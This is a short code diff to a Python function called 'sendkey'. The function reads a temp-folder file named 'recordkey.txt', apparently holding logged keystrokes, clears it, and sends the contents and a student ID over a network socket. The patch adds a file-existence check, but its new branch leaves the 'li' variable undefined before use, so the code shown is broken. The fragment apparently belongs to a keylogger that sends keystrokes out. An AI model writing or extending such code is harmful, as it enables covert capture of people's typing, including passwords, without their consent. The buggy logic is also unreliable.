@@ -164,11 +164,15 @@ def sendkey():
             continue
         path = os.getenv('temp')
         filename = path + '\\' + 'recordkey.txt'
-        with open(filename, 'r+') as fp:
-            li = fp.readlines()
-            fp.seek(0)
-            fp.truncate()
-            fp.close()
+        if os.path.exists(filename):
+            with open(filename, 'r+') as fp:
+                li = fp.readlines()
+                fp.seek(0)
+                fp.truncate()
+                fp.close()
+        else:
+            with open(filename, mode='w', encoding='utf-8') as ff:
+                print("文件创建成功！")
         records = ''.join(li).encode()
         xuehao1 = xuehao.encode()
         sock.send(xuehao1)
